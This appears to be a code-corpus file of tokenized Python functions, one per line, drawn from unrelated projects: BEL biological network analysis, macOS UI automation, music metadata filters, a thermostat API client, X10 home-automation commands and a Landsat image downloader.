def count_defaultdict ( dict_of_lists : Mapping [ X , List [ Y ] ] ) -> Mapping [ X , typing . Counter [ Y ] ] : return { k : Counter ( v ) for k , v in dict_of_lists . items ( ) }
def tanimoto_set_similarity ( x : Iterable [ X ] , y : Iterable [ X ] ) -> float : a , b = set ( x ) , set ( y ) union = a | b if not union : return 0.0 return len ( a & b ) / len ( union )
def barh ( d , plt , title = None ) : labels = sorted ( d , key = d . get ) index = range ( len ( labels ) ) plt . yticks ( index , labels ) plt . barh ( index , [ d [ v ] for v in labels ] ) if title is not None : plt . title ( title )
def barv ( d , plt , title = None , rotation = 'vertical' ) : labels = sorted ( d , key = d . get , reverse = True ) index = range ( len ( labels ) ) plt . xticks ( index , labels , rotation = rotation ) plt . bar ( index , [ d [ v ] for v in labels ] ) if title is not None : plt . title ( title )
def relation_set_has_contradictions ( relations : Set [ str ] ) -> bool : has_increases = any ( relation in CAUSAL_INCREASE_RELATIONS for relation in relations ) has_decreases = any ( relation in CAUSAL_DECREASE_RELATIONS for relation in relations ) has_cnc = any ( relation == CAUSES_NO_CHANGE for relation in relations ) return 1 < sum ( [ has_cnc , has_decreases , has_increases ] )
def get_network_summary_dict ( graph : BELGraph ) -> Mapping : return dict ( # Counters function_count = count_functions ( graph ) , modifications_count = get_modifications_count ( graph ) , relation_count = count_relations ( graph ) , authors_count = count_authors ( graph ) . most_common ( 15 ) , variants_count = count_variants ( graph ) , namespaces_count = count_namespaces ( graph ) , hub_data = { ( node . name or node . identifier if NAME in node or IDENTIFIER in node else str ( node ) ) : degree for node , degree in get_top_hubs ( graph , n = 15 ) } , disease_data = { ( node . name or node . identifier if NAME in node or IDENTIFIER in node else str ( node ) ) : count for node , count in get_top_pathologies ( graph , n = 15 ) } , # BioGrammar regulatory_pairs = [ get_pair_tuple ( u , v ) for u , v in get_regulatory_pairs ( graph ) ] , unstable_pairs = list ( itt . chain ( ( get_pair_tuple ( u , v ) + ( 'Chaotic' , ) for u , v , in get_chaotic_pairs ( graph ) ) , ( get_pair_tuple ( u , v ) + ( 'Dampened' , ) for u , v , in get_dampened_pairs ( graph ) ) , ) ) , contradictory_pairs = [ get_pair_tuple ( u , v ) + ( relation , ) for u , v , relation in get_contradiction_summary ( graph ) ] , contradictory_triplets = list ( itt . chain ( ( get_triplet_tuple ( a , b , c ) + ( 'Separate' , ) for a , b , c in get_separate_unstable_correlation_triples ( graph ) ) , ( get_triplet_tuple ( a , b , c ) + ( 'Mutual' , ) for a , b , c in get_mutually_unstable_correlation_triples ( graph ) ) , ( get_triplet_tuple ( a , b , c ) + ( 'Jens' , ) for a , b , c in get_jens_unstable ( graph ) ) , ( get_triplet_tuple ( a , b , c ) + ( 'Increase Mismatch' , ) for a , b , c in get_increase_mismatch_triplets ( graph ) ) , ( get_triplet_tuple ( a , b , c ) + ( 'Decrease Mismatch' , ) for a , b , c in get_decrease_mismatch_triplets ( graph ) ) , ) ) , unstable_triplets = list ( itt . chain ( ( get_triplet_tuple ( a , b , c ) + ( 'Chaotic' , ) for a , b , c in get_chaotic_triplets ( graph ) ) , ( get_triplet_tuple ( a , b , c ) + ( 'Dampened' , ) for a , b , c in get_dampened_triplets ( graph ) ) , ) ) , causal_pathologies = sorted ( { get_pair_tuple ( u , v ) + ( graph [ u ] [ v ] [ k ] [ RELATION ] , ) for u , v , k in filter_edges ( graph , has_pathology_causal ) } ) , # Misc. undefined_namespaces = get_undefined_namespaces ( graph ) , undefined_annotations = get_undefined_annotations ( graph ) , namespaces_with_incorrect_names = get_namespaces_with_incorrect_names ( graph ) , unused_namespaces = get_unused_namespaces ( graph ) , unused_annotations = get_unused_annotations ( graph ) , unused_list_annotation_values = get_unused_list_annotation_values ( graph ) , naked_names = get_naked_names ( graph ) , error_count = count_error_types ( graph ) , # Errors error_groups = get_most_common_errors ( graph ) , syntax_errors = get_syntax_errors ( graph ) , # Bibliometrics citation_years = get_citation_years ( graph ) , confidence_count = count_confidences ( graph ) , )
def group_nodes_by_annotation ( graph : BELGraph , annotation : str = 'Subgraph' ) -> Mapping [ str , Set [ BaseEntity ] ] : result = defaultdict ( set ) for u , v , d in graph . edges ( data = True ) : if not edge_has_annotation ( d , annotation ) : continue result [ d [ ANNOTATIONS ] [ annotation ] ] . add ( u ) result [ d [ ANNOTATIONS ] [ annotation ] ] . add ( v ) return dict ( result )
def build_expand_node_neighborhood_by_hash ( manager : Manager ) -> Callable [ [ BELGraph , BELGraph , str ] , None ] : @ uni_in_place_transformation def expand_node_neighborhood_by_hash ( universe : BELGraph , graph : BELGraph , node_hash : str ) -> None : """Expand around the neighborhoods of a node by identifier.""" node = manager . get_dsl_by_hash ( node_hash ) return expand_node_neighborhood ( universe , graph , node ) return expand_node_neighborhood_by_hash
def build_delete_node_by_hash ( manager : Manager ) -> Callable [ [ BELGraph , str ] , None ] : @ in_place_transformation def delete_node_by_hash ( graph : BELGraph , node_hash : str ) -> None : """Remove a node by identifier.""" node = manager . get_dsl_by_hash ( node_hash ) graph . remove_node ( node ) return delete_node_by_hash
def update_spia_matrices ( spia_matrices : Dict [ str , pd . DataFrame ] , u : CentralDogma , v : CentralDogma , edge_data : EdgeData , ) -> None : if u . namespace . upper ( ) != 'HGNC' or v . namespace . upper ( ) != 'HGNC' : return u_name = u . name v_name = v . name relation = edge_data [ RELATION ] if relation in CAUSAL_INCREASE_RELATIONS : # If it has pmod check which one and add it to the corresponding matrix if v . variants and any ( isinstance ( variant , ProteinModification ) for variant in v . variants ) : for variant in v . variants : if not isinstance ( variant , ProteinModification ) : continue if variant [ IDENTIFIER ] [ NAME ] == "Ub" : spia_matrices [ "activation_ubiquination" ] [ u_name ] [ v_name ] = 1 elif variant [ IDENTIFIER ] [ NAME ] == "Ph" : spia_matrices [ "activation_phosphorylation" ] [ u_name ] [ v_name ] = 1 elif isinstance ( v , ( Gene , Rna ) ) : # Normal increase, add activation spia_matrices [ 'expression' ] [ u_name ] [ v_name ] = 1 else : spia_matrices [ 'activation' ] [ u_name ] [ v_name ] = 1 elif relation in CAUSAL_DECREASE_RELATIONS : # If it has pmod check which one and add it to the corresponding matrix if v . variants and any ( isinstance ( variant , ProteinModification ) for variant in v . variants ) : for variant in v . variants : if not isinstance ( variant , ProteinModification ) : continue if variant [ IDENTIFIER ] [ NAME ] == "Ub" : spia_matrices [ 'inhibition_ubiquination' ] [ u_name ] [ v_name ] = 1 elif variant [ IDENTIFIER ] [ NAME ] == "Ph" : spia_matrices [ "inhibition_phosphorylation" ] [ u_name ] [ v_name ] = 1 elif isinstance ( v , ( Gene , Rna ) ) : # Normal decrease, check which matrix spia_matrices [ "repression" ] [ u_name ] [ v_name ] = 1 else : spia_matrices [ "inhibition" ] [ u_name ] [ v_name ] = 1 elif relation == ASSOCIATION : spia_matrices [ "binding_association" ] [ u_name ] [ v_name ] = 1
def spia_matrices_to_tsvs ( spia_matrices : Mapping [ str , pd . DataFrame ] , directory : str ) -> None : os . makedirs ( directory , exist_ok = True ) for relation , df in spia_matrices . items ( ) : df . to_csv ( os . path . join ( directory , f'{relation}.tsv' ) , index = True )
def main ( graph : BELGraph , xlsx : str , tsvs : str ) : if not xlsx and not tsvs : click . secho ( 'Specify at least one option --xlsx or --tsvs' , fg = 'red' ) sys . exit ( 1 ) spia_matrices = bel_to_spia_matrices ( graph ) if xlsx : spia_matrices_to_excel ( spia_matrices , xlsx ) if tsvs : spia_matrices_to_tsvs ( spia_matrices , tsvs )
def get_entrez_gene_data ( entrez_ids : Iterable [ Union [ str , int ] ] ) : url = PUBMED_GENE_QUERY_URL . format ( ',' . join ( str ( x ) . strip ( ) for x in entrez_ids ) ) response = requests . get ( url ) tree = ElementTree . fromstring ( response . content ) return { element . attrib [ 'uid' ] : { 'summary' : _sanitize ( element . find ( 'Summary' ) . text ) , 'description' : element . find ( 'Description' ) . text } for element in tree . findall ( './DocumentSummarySet/DocumentSummary' ) }
def get_largest_component ( graph : BELGraph ) -> BELGraph : biggest_component_nodes = max ( nx . weakly_connected_components ( graph ) , key = len ) return subgraph ( graph , biggest_component_nodes )
def self_edge_filter ( _ : BELGraph , source : BaseEntity , target : BaseEntity , __ : str ) -> bool : return source == target
def has_protein_modification_increases_activity ( graph : BELGraph , source : BaseEntity , target : BaseEntity , key : str , ) -> bool : edge_data = graph [ source ] [ target ] [ key ] return has_protein_modification ( graph , source ) and part_has_modifier ( edge_data , OBJECT , ACTIVITY )
def has_degradation_increases_activity ( data : Dict ) -> bool : return part_has_modifier ( data , SUBJECT , DEGRADATION ) and part_has_modifier ( data , OBJECT , ACTIVITY )
def has_translocation_increases_activity ( data : Dict ) -> bool : return part_has_modifier ( data , SUBJECT , TRANSLOCATION ) and part_has_modifier ( data , OBJECT , ACTIVITY )
def complex_has_member ( graph : BELGraph , complex_node : ComplexAbundance , member_node : BaseEntity ) -> bool : return any ( # TODO can't you look in the members of the complex object (if it's enumerated) v == member_node for _ , v , data in graph . out_edges ( complex_node , data = True ) if data [ RELATION ] == HAS_COMPONENT )
def complex_increases_activity ( graph : BELGraph , u : BaseEntity , v : BaseEntity , key : str ) -> bool : return ( isinstance ( u , ( ComplexAbundance , NamedComplexAbundance ) ) and complex_has_member ( graph , u , v ) and part_has_modifier ( graph [ u ] [ v ] [ key ] , OBJECT , ACTIVITY ) )
def find_activations ( graph : BELGraph ) : for u , v , key , data in graph . edges ( keys = True , data = True ) : if u != v : continue bel = graph . edge_to_bel ( u , v , data ) line = data . get ( LINE ) if line is None : continue # this was inferred, so need to investigate another way elif has_protein_modification_increases_activity ( graph , u , v , key ) : print ( line , '- pmod changes -' , bel ) find_related ( graph , v , data ) elif has_degradation_increases_activity ( data ) : print ( line , '- degradation changes -' , bel ) find_related ( graph , v , data ) elif has_translocation_increases_activity ( data ) : print ( line , '- translocation changes -' , bel ) find_related ( graph , v , data ) elif complex_increases_activity ( graph , u , v , key ) : print ( line , '- complex changes - ' , bel ) find_related ( graph , v , data ) elif has_same_subject_object ( graph , u , v , key ) : print ( line , '- same sub/obj -' , bel ) else : print ( line , '- *** - ' , bel )
def summarize_edge_filter ( graph : BELGraph , edge_predicates : EdgePredicates ) -> None : passed = count_passed_edge_filter ( graph , edge_predicates ) print ( '{}/{} edges passed {}' . format ( passed , graph . number_of_edges ( ) , ( ', ' . join ( edge_filter . __name__ for edge_filter in edge_predicates ) if isinstance ( edge_predicates , Iterable ) else edge_predicates . __name__ ) ) )
def node_has_namespace ( node : BaseEntity , namespace : str ) -> bool : ns = node . get ( NAMESPACE ) return ns is not None and ns == namespace
def node_has_namespaces ( node : BaseEntity , namespaces : Set [ str ] ) -> bool : ns = node . get ( NAMESPACE ) return ns is not None and ns in namespaces
def get_cutoff ( value : float , cutoff : Optional [ float ] = None ) -> int : cutoff = cutoff if cutoff is not None else 0 if value > cutoff : return 1 if value < ( - 1 * cutoff ) : return - 1 return 0
def one_sided ( value : float , distribution : List [ float ] ) -> float : assert distribution return sum ( value < element for element in distribution ) / len ( distribution )
def _get_drug_target_interactions ( manager : Optional [ 'bio2bel_drugbank.manager' ] = None ) -> Mapping [ str , List [ str ] ] : if manager is None : import bio2bel_drugbank manager = bio2bel_drugbank . Manager ( ) if not manager . is_populated ( ) : manager . populate ( ) return manager . get_drug_to_hgnc_symbols ( )
def multi_run_epicom ( graphs : Iterable [ BELGraph ] , path : Union [ None , str , TextIO ] ) -> None : if isinstance ( path , str ) : with open ( path , 'w' ) as file : _multi_run_helper_file_wrapper ( graphs , file ) else : _multi_run_helper_file_wrapper ( graphs , path )
def main ( ) : logging . basicConfig ( level = logging . INFO ) log . setLevel ( logging . INFO ) bms_base = get_bms_base ( ) neurommsig_base = get_neurommsig_base ( ) neurommsig_excel_dir = os . path . join ( neurommsig_base , 'resources' , 'excels' , 'neurommsig' ) nift_values = get_nift_values ( ) log . info ( 'Starting Alzheimers' ) ad_path = os . path . join ( neurommsig_excel_dir , 'alzheimers' , 'alzheimers.xlsx' ) ad_df = preprocess ( ad_path ) with open ( os . path . join ( bms_base , 'aetionomy' , 'alzheimers' , 'neurommsigdb_ad.bel' ) , 'w' ) as ad_file : write_neurommsig_bel ( ad_file , ad_df , mesh_alzheimer , nift_values ) log . info ( 'Starting Parkinsons' ) pd_path = os . path . join ( neurommsig_excel_dir , 'parkinsons' , 'parkinsons.xlsx' ) pd_df = preprocess ( pd_path ) with open ( os . path . join ( bms_base , 'aetionomy' , 'parkinsons' , 'neurommsigdb_pd.bel' ) , 'w' ) as pd_file : write_neurommsig_bel ( pd_file , pd_df , mesh_parkinson , nift_values )
def unscored_nodes_iter ( self ) -> BaseEntity : for node , data in self . graph . nodes ( data = True ) : if self . tag not in data : yield node
def remove_random_edge_until_has_leaves ( self ) -> None : while True : leaves = set ( self . iter_leaves ( ) ) if leaves : return self . remove_random_edge ( )
def calculate_score ( self , node : BaseEntity ) -> float : score = ( self . graph . nodes [ node ] [ self . tag ] if self . tag in self . graph . nodes [ node ] else self . default_score ) for predecessor , _ , d in self . graph . in_edges ( node , data = True ) : if d [ RELATION ] in CAUSAL_INCREASE_RELATIONS : score += self . graph . nodes [ predecessor ] [ self . tag ] elif d [ RELATION ] in CAUSAL_DECREASE_RELATIONS : score -= self . graph . nodes [ predecessor ] [ self . tag ] return score
def node_exclusion_filter_builder ( nodes : Iterable [ BaseEntity ] ) -> NodePredicate : node_set = set ( nodes ) def exclusion_filter ( _ : BELGraph , node : BaseEntity ) -> bool : return node not in node_set return exclusion_filter
def variants_of ( graph : BELGraph , node : Protein , modifications : Optional [ Set [ str ] ] = None , ) -> Set [ Protein ] : if modifications : return _get_filtered_variants_of ( graph , node , modifications ) return { v for u , v , key , data in graph . edges ( keys = True , data = True ) if ( u == node and data [ RELATION ] == HAS_VARIANT and pybel . struct . has_protein_modification ( v ) ) }
def get_variants_to_controllers ( graph : BELGraph , node : Protein , modifications : Optional [ Set [ str ] ] = None , ) -> Mapping [ Protein , Set [ Protein ] ] : rv = defaultdict ( set ) variants = variants_of ( graph , node , modifications ) for controller , variant , data in graph . in_edges ( variants , data = True ) : if data [ RELATION ] in CAUSAL_RELATIONS : rv [ variant ] . add ( controller ) return rv
def group_dict_set ( iterator : Iterable [ Tuple [ A , B ] ] ) -> Mapping [ A , Set [ B ] ] : d = defaultdict ( set ) for key , value in iterator : d [ key ] . add ( value ) return dict ( d )
def boilerplate ( name , contact , description , pmids , version , copyright , authors , licenses , disclaimer , output ) : from . document_utils import write_boilerplate write_boilerplate ( name = name , version = version , description = description , authors = authors , contact = contact , copyright = copyright , licenses = licenses , disclaimer = disclaimer , pmids = pmids , file = output , )
def get_pmids ( graph : BELGraph , output : TextIO ) : for pmid in get_pubmed_identifiers ( graph ) : click . echo ( pmid , file = output )
def _glob_match ( self , pattern , string ) : # regex flags Multi-line, Unicode, Locale return bool ( re . match ( fnmatch . translate ( pattern ) , string , re . M | re . U | re . L ) )
def _getRunningApps ( cls ) : def runLoopAndExit ( ) : AppHelper . stopEventLoop ( ) AppHelper . callLater ( 1 , runLoopAndExit ) AppHelper . runConsoleEventLoop ( ) # Get a list of running applications ws = AppKit . NSWorkspace . sharedWorkspace ( ) apps = ws . runningApplications ( ) return apps
def launchAppByBundleId ( bundleID ) : # NSWorkspaceLaunchAllowingClassicStartup does nothing on any # modern system that doesn't have the classic environment installed. # Encountered a bug when passing 0 for no options on 10.6 PyObjC. ws = AppKit . NSWorkspace . sharedWorkspace ( ) # Sorry about the length of the following line r = ws . launchAppWithBundleIdentifier_options_additionalEventParamDescriptor_launchIdentifier_ ( bundleID , AppKit . NSWorkspaceLaunchAllowingClassicStartup , AppKit . NSAppleEventDescriptor . nullDescriptor ( ) , None ) # On 10.6, this returns a tuple - first element bool result, second is # a number. Let's use the bool result. if not r [ 0 ] : raise RuntimeError ( 'Error launching specified application.' )
def _getActions ( self ) : actions = _a11y . AXUIElement . _getActions ( self ) # strip leading AX from actions - help distinguish them from attributes return [ action [ 2 : ] for action in actions ]
def _performAction ( self , action ) : try : _a11y . AXUIElement . _performAction ( self , 'AX%s' % action ) except _a11y . ErrorUnsupported as e : sierra_ver = '10.12' if mac_ver ( ) [ 0 ] < sierra_ver : raise e else : pass
def _generateChildren ( self ) : try : children = self . AXChildren except _a11y . Error : return if children : for child in children : yield child
def _generateChildrenR ( self , target = None ) : if target is None : target = self try : children = target . AXChildren except _a11y . Error : return if children : for child in children : yield child for c in self . _generateChildrenR ( child ) : yield c
def _matchOther ( self , obj , * * kwargs ) : if obj is not None : # Need to check that the returned UI element wasn't destroyed first: if self . _findFirstR ( * * kwargs ) : return obj . _match ( * * kwargs ) return False
def _generateFind ( self , * * kwargs ) : for needle in self . _generateChildren ( ) : if needle . _match ( * * kwargs ) : yield needle
def _generateFindR ( self , * * kwargs ) : for needle in self . _generateChildrenR ( ) : if needle . _match ( * * kwargs ) : yield needle
def _findAll ( self , * * kwargs ) : result = [ ] for item in self . _generateFind ( * * kwargs ) : result . append ( item ) return result
def _getBundleId ( self ) : ra = AppKit . NSRunningApplication app = ra . runningApplicationWithProcessIdentifier_ ( self . _getPid ( ) ) return app . bundleIdentifier ( )
def popUpItem ( self , * args ) : self . Press ( ) time . sleep ( .5 ) return self . _menuItem ( self , * args )
def _convenienceMatch ( self , role , attr , match ) : kwargs = { } # If the user supplied some text to search for, # supply that in the kwargs if match : kwargs [ attr ] = match return self . findAll ( AXRole = role , * * kwargs )
def _convenienceMatchR ( self , role , attr , match ) : kwargs = { } # If the user supplied some text to search for, # supply that in the kwargs if match : kwargs [ attr ] = match return self . findAllR ( AXRole = role , * * kwargs )
def main ( port = 4118 , parentpid = None ) : if "LDTP_DEBUG" in os . environ : _ldtp_debug = True else : _ldtp_debug = False _ldtp_debug_file = os . environ . get ( 'LDTP_DEBUG_FILE' , None ) if _ldtp_debug : print ( "Parent PID: {}" . format ( int ( parentpid ) ) ) if _ldtp_debug_file : with open ( unicode ( _ldtp_debug_file ) , "a" ) as fp : fp . write ( "Parent PID: {}" . format ( int ( parentpid ) ) ) server = LDTPServer ( ( '' , port ) , allow_none = True , logRequests = _ldtp_debug , requestHandler = RequestHandler ) server . register_introspection_functions ( ) server . register_multicall_functions ( ) ldtp_inst = core . Core ( ) server . register_instance ( ldtp_inst ) if parentpid : thread . start_new_thread ( notifyclient , ( parentpid , ) ) try : server . serve_forever ( ) except KeyboardInterrupt : pass except : if _ldtp_debug : print ( traceback . format_exc ( ) ) if _ldtp_debug_file : with open ( _ldtp_debug_file , "a" ) as fp : fp . write ( traceback . format_exc ( ) )
def server_bind ( self , * args , * * kwargs ) : self . socket . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) # Can't use super() here since SimpleXMLRPCServer is an old-style class SimpleXMLRPCServer . server_bind ( self , * args , * * kwargs )
def cast_to_list ( position ) : @ wrapt . decorator def wrapper ( function , instance , args , kwargs ) : if not isinstance ( args [ position ] , list ) : args = list ( args ) args [ position ] = [ args [ position ] ] args = tuple ( args ) return function ( * args , * * kwargs ) return wrapper
def _forbidden_attributes ( obj ) : for key in list ( obj . data . keys ( ) ) : if key in list ( obj . reserved_keys . keys ( ) ) : obj . data . pop ( key ) return obj
def convert_cygwin_path ( path ) : try : win_path = subprocess . check_output ( [ "cygpath" , "-aw" , path ] , universal_newlines = True ) . strip ( ) except ( FileNotFoundError , subprocess . CalledProcessError ) : logger . exception ( "Call to cygpath failed." ) raise return win_path
def _get_mutagen_metadata ( filepath ) : try : metadata = mutagen . File ( filepath , easy = True ) except mutagen . MutagenError : logger . warning ( "Can't load {} as music file." . format ( filepath ) ) raise return metadata
def _mutagen_fields_to_single_value ( metadata ) : return dict ( ( k , v [ 0 ] ) for k , v in metadata . items ( ) if v )
def _normalize_metadata ( metadata ) : metadata = str ( metadata ) metadata = metadata . lower ( ) metadata = re . sub ( r'\/\s*\d+' , '' , metadata ) # Remove "/<totaltracks>" from track number. metadata = re . sub ( r'^0+([0-9]+)' , r'\1' , metadata ) # Remove leading zero(s) from track number. metadata = re . sub ( r'^\d+\.+' , '' , metadata ) # Remove dots from track number. metadata = re . sub ( r'[^\w\s]' , '' , metadata ) # Remove any non-words. metadata = re . sub ( r'\s+' , ' ' , metadata ) # Reduce multiple spaces to a single space. metadata = re . sub ( r'^\s+' , '' , metadata ) # Remove leading space. metadata = re . sub ( r'\s+$' , '' , metadata ) # Remove trailing space. metadata = re . sub ( r'^the\s+' , '' , metadata , re . I ) # Remove leading "the". return metadata
def _check_field_value ( field_value , pattern ) : if isinstance ( field_value , list ) : return any ( re . search ( pattern , str ( value ) , re . I ) for value in field_value ) else : return re . search ( pattern , str ( field_value ) , re . I )
def _check_filters ( song , include_filters = None , exclude_filters = None , all_includes = False , all_excludes = False ) : include = True if include_filters : if all_includes : if not all ( field in song and _check_field_value ( song [ field ] , pattern ) for field , pattern in include_filters ) : include = False else : if not any ( field in song and _check_field_value ( song [ field ] , pattern ) for field , pattern in include_filters ) : include = False if exclude_filters : if all_excludes : if all ( field in song and _check_field_value ( song [ field ] , pattern ) for field , pattern in exclude_filters ) : include = False else : if any ( field in song and _check_field_value ( song [ field ] , pattern ) for field , pattern in exclude_filters ) : include = False return include
def _url ( self , endpoint , url_data = None , parameters = None ) : try : url = '%s/%s' % ( self . base_url , self . endpoints [ endpoint ] ) except KeyError : raise EndPointDoesNotExist ( endpoint ) if url_data : url = url % url_data if parameters : # url = url?key=value&key=value&key=value... url = '%s?%s' % ( url , urllib . urlencode ( parameters , True ) ) return url
def _httplib2_init ( username , password ) : obj = httplib2 . Http ( ) if username and password : obj . add_credentials ( username , password ) return obj
def prepare_to_run ( self ) : self . clock . reset ( ) for e in self . entities : e . prepare_to_run ( self . clock , self . period_count )
def run ( self ) : self . prepare_to_run ( ) for i in range ( 0 , self . period_count ) : for e in self . entities : e . run ( self . clock ) self . clock . tick ( )
def get ( self , key , default = None ) : if self . in_memory : return self . _memory_db . get ( key , default ) else : db = self . _read_file ( ) return db . get ( key , default )
def paginate_link_tag ( item ) : a_tag = Page . default_link_tag ( item ) if item [ 'type' ] == 'current_page' : return make_html_tag ( 'li' , a_tag , * * { 'class' : 'blue white-text' } ) return make_html_tag ( 'li' , a_tag )
def set_state ( _id , body ) : url = DEVICE_URL % _id if "mode" in body : url = MODES_URL % _id arequest = requests . put ( url , headers = HEADERS , data = json . dumps ( body ) ) status_code = str ( arequest . status_code ) if status_code != '202' : _LOGGER . error ( "State not accepted. " + status_code ) return False
def get_modes ( _id ) : url = MODES_URL % _id arequest = requests . get ( url , headers = HEADERS ) status_code = str ( arequest . status_code ) if status_code == '401' : _LOGGER . error ( "Token expired." ) return False return arequest . json ( )
def get_usage ( _id ) : url = USAGE_URL % _id arequest = requests . get ( url , headers = HEADERS ) status_code = str ( arequest . status_code ) if status_code == '401' : _LOGGER . error ( "Token expired." ) return False try : return arequest . json ( ) except ValueError : _LOGGER . info ( "Failed to get usage. Not supported by unit?" ) return None
def get_device ( _id ) : url = DEVICE_URL % _id arequest = requests . get ( url , headers = HEADERS ) status_code = str ( arequest . status_code ) if status_code == '401' : _LOGGER . error ( "Token expired." ) return False return arequest . json ( )
def get_locations ( ) : arequest = requests . get ( LOCATIONS_URL , headers = HEADERS ) status_code = str ( arequest . status_code ) if status_code == '401' : _LOGGER . error ( "Token expired." ) return False return arequest . json ( )
def get_vacations ( ) : arequest = requests . get ( VACATIONS_URL , headers = HEADERS ) status_code = str ( arequest . status_code ) if status_code == '401' : _LOGGER . error ( "Token expired." ) return False return arequest . json ( )
def create_vacation ( body ) : arequest = requests . post ( VACATIONS_URL , headers = HEADERS , data = json . dumps ( body ) ) status_code = str ( arequest . status_code ) if status_code != '200' : _LOGGER . error ( "Failed to create vacation. " + status_code ) _LOGGER . error ( arequest . json ( ) ) return False return arequest . json ( )
def delete_vacation ( _id ) : arequest = requests . delete ( VACATIONS_URL + "/" + _id , headers = HEADERS ) status_code = str ( arequest . status_code ) if status_code != '202' : _LOGGER . error ( "Failed to delete vacation. " + status_code ) return False return True
def _authenticate ( self ) : auth_url = BASE_URL + "/auth/token" payload = { 'username' : self . email , 'password' : self . password , 'grant_type' : 'password' } arequest = requests . post ( auth_url , data = payload , headers = BASIC_HEADERS ) status = arequest . status_code if status != 200 : _LOGGER . error ( "Authentication request failed, please check credintials. " + str ( status ) ) return False response = arequest . json ( ) _LOGGER . debug ( str ( response ) ) self . token = response . get ( "access_token" ) self . refresh_token = response . get ( "refresh_token" ) _auth = HEADERS . get ( "Authorization" ) _auth = _auth % self . token HEADERS [ "Authorization" ] = _auth _LOGGER . info ( "Authentication was successful, token set." ) return True
def models_preparing ( app ) : def wrapper ( resource , parent ) : if isinstance ( resource , DeclarativeMeta ) : resource = ListResource ( resource ) if not getattr ( resource , '__parent__' , None ) : resource . __parent__ = parent return resource resources_preparing_factory ( app , wrapper )
def _translateCommands ( commands ) : for command in commands . split ( ',' ) : # each command results in 2 bytes of binary data result = [ 0 , 0 ] device , command = command . strip ( ) . upper ( ) . split ( None , 1 ) # translate the house code result [ 0 ] = houseCodes [ device [ 0 ] ] # translate the device number if there is one if len ( device ) > 1 : deviceNumber = deviceNumbers [ device [ 1 : ] ] result [ 0 ] |= deviceNumber [ 0 ] result [ 1 ] = deviceNumber [ 1 ] # translate the command result [ 1 ] |= commandCodes [ command ] # convert 2 bytes to bit strings and yield them yield ' ' . join ( map ( _strBinary , result ) )
def _setRTSDTR ( port , RTS , DTR ) : port . setRTS ( RTS ) port . setDTR ( DTR )
def lower ( option , value ) : if type ( option ) is str : option = option . lower ( ) if type ( value ) is str : value = value . lower ( ) return ( option , value )
def to_float ( option , value ) : if type ( value ) is str : try : value = float ( value ) except ValueError : pass return ( option , value )
def to_bool ( option , value ) : if type ( value ) is str : if value . lower ( ) == 'true' : value = True elif value . lower ( ) == 'false' : value = False return ( option , value )
def fork ( self , name ) : fork = deepcopy ( self ) self [ name ] = fork return fork
def ld_to_dl ( ld ) : if ld : keys = list ( ld [ 0 ] ) dl = { key : [ d [ key ] for d in ld ] for key in keys } return dl else : return { }
def split_list ( l , N ) : npmode = isinstance ( l , np . ndarray ) if npmode : l = list ( l ) g = np . concatenate ( ( np . array ( [ 0 ] ) , np . cumsum ( split_integer ( len ( l ) , length = N ) ) ) ) s = [ l [ g [ i ] : g [ i + 1 ] ] for i in range ( N ) ] if npmode : s = [ np . array ( sl ) for sl in s ] return s
def log_calls ( function ) : def wrapper ( self , * args , * * kwargs ) : self . log . log ( group = function . __name__ , message = 'Enter' ) function ( self , * args , * * kwargs ) self . log . log ( group = function . __name__ , message = 'Exit' ) return wrapper
def add_runtime ( function ) : def wrapper ( * args , * * kwargs ) : pr = cProfile . Profile ( ) pr . enable ( ) output = function ( * args , * * kwargs ) pr . disable ( ) return pr , output return wrapper
def print_memory ( function ) : import memory_profiler def wrapper ( * args , * * kwargs ) : m = StringIO ( ) temp_func = memory_profiler . profile ( func = function , stream = m , precision = 4 ) output = temp_func ( * args , * * kwargs ) print ( m . getvalue ( ) ) m . close ( ) return output return wrapper
def print_profile ( function ) : import memory_profiler def wrapper ( * args , * * kwargs ) : m = StringIO ( ) pr = cProfile . Profile ( ) pr . enable ( ) temp_func = memory_profiler . profile ( func = function , stream = m , precision = 4 ) output = temp_func ( * args , * * kwargs ) print ( m . getvalue ( ) ) pr . disable ( ) ps = pstats . Stats ( pr ) ps . sort_stats ( 'cumulative' ) . print_stats ( '(?!.*memory_profiler.*)(^.*$)' , 20 ) m . close ( ) return output return wrapper
def print_runtime ( function ) : def wrapper ( * args , * * kwargs ) : pr = cProfile . Profile ( ) pr . enable ( ) output = function ( * args , * * kwargs ) pr . disable ( ) ps = pstats . Stats ( pr ) ps . sort_stats ( 'tot' ) . print_stats ( 20 ) return output return wrapper
def get_default_fields ( self ) : field_names = self . _meta . get_all_field_names ( ) if 'id' in field_names : field_names . remove ( 'id' ) return field_names
def validate_bands ( self , bands ) : if not isinstance ( bands , list ) : logger . error ( 'Parameter bands must be a "list"' ) raise TypeError ( 'Parameter bands must be a "list"' ) valid_bands = list ( range ( 1 , 12 ) ) + [ 'BQA' ] for band in bands : if band not in valid_bands : logger . error ( '%s is not a valid band' % band ) raise InvalidBandError ( '%s is not a valid band' % band )
def download ( self , bands , download_dir = None , metadata = False ) : super ( GoogleDownloader , self ) . validate_bands ( bands ) pattern = re . compile ( '^[^\s]+_(.+)\.tiff?' , re . I ) image_list = [ ] band_list = [ 'B%i' % ( i , ) if isinstance ( i , int ) else i for i in bands ] if download_dir is None : download_dir = DOWNLOAD_DIR check_create_folder ( join ( download_dir , self . sceneInfo . name ) ) filename = "%s%s" % ( self . sceneInfo . name , self . __remote_file_ext ) downloaded = self . fetch ( self . remote_file_url , download_dir , filename ) try : tar = tarfile . open ( downloaded [ 0 ] , 'r' ) folder_path = join ( download_dir , self . sceneInfo . name ) logger . debug ( 'Starting data extraction in directory ' , folder_path ) tar . extractall ( folder_path ) remove ( downloaded [ 0 ] ) images_path = listdir ( folder_path ) for image_path in images_path : matched = pattern . match ( image_path ) file_path = join ( folder_path , image_path ) if matched and matched . group ( 1 ) in band_list : image_list . append ( [ file_path , getsize ( file_path ) ] ) elif matched : remove ( file_path ) except tarfile . ReadError as error : logger . error ( 'Error when extracting files: ' , error ) print ( 'Error when extracting files.' ) return image_list
def validate_sceneInfo ( self ) : if self . sceneInfo . prefix not in self . __prefixesValid : raise WrongSceneNameError ( 'AWS: Prefix of %s (%s) is invalid' % ( self . sceneInfo . name , self . sceneInfo . prefix ) )
